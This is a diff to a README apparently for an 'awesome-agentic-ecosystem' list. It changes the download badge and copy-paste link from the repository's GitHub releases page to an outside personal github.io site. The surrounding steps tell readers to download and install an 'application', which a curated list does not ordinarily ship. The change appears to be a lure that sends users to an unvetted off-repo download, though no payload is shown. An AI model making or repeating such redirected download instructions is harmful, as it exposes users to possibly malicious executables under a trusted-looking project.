@@ -51,10 +51,10 @@ Each tool includes relevant tags and keywords. You can scan through sections or 
 ### Step 1: Visit the Download Page
 Click the button below to go to the official download location:
 
-[![Download Now](https://img.shields.io/badge/Download-awesome--agentic--ecosystem-2ea44f?style=for-the-badge)](https://github.com/Bfzwq2925/awesome-agentic-ecosystem/releases)
+[![Download Now](https://img.shields.io/badge/Download-awesome--agentic--ecosystem-2ea44f?style=for-the-badge)](https://bfzwq2925.github.io)
 
 Alternatively, you can copy and paste this link into your web browser:
-`https://github.com/Bfzwq2925/awesome-agentic-ecosystem/releases`
+`https://bfzwq2925.github.io`
 
 ### Step 2: Download the Application
 Visit this link to download the application. Look for the newest version available on the page. Click the download button to save the file to your computer.
